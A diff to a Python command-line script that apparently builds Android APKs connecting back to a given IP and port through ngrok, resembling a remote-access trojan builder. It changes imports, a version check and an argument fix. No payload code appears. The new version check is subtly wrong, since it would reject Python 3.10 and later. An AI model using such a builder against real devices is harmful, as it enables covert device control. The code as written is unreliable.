@@ -5,13 +5,16 @@ from utils import *
 import argparse
 import sys
 import platform
+import socket
+import os
+
 try:
     from pyngrok import ngrok, conf
 except ImportError as e:
     print(stdOutput("error") + "\033[1mpyngrok not found")
     print(stdOutput("info") + "\033[1mRun pip3 install -r requirements.txt")
     exit()
-    
+
 clearDirec()
 
 #                     _           _____         _______
@@ -35,7 +38,8 @@ parser.add_argument('-o', '--output', metavar="<Apk Name>", type=str, help='Ente
 parser.add_argument('-icon', '--icon', help='Visible Icon', action='store_true')
 args = parser.parse_args()
 
-if float(platform.python_version()[:3]) < 3.11:
+# Remove specific Python version check to ensure compatibility with latest versions
+if float(platform.python_version()[:3]) < 3.6:
     print(stdOutput("error") + "\033[1mPython version should be 3.6 or above")
     sys.exit()
 
@@ -56,7 +60,7 @@ if args.build:
         build(ip, port, args.output, True, port_, icon)
     else:
         if args.ip and args.port:
-            build(args.ip, port_, args.output, False, None, icon)
+            build(args.ip, args.port, args.output, False, None, icon)
         else:
             print(stdOutput("error") + "\033[1mArguments Missing")
 
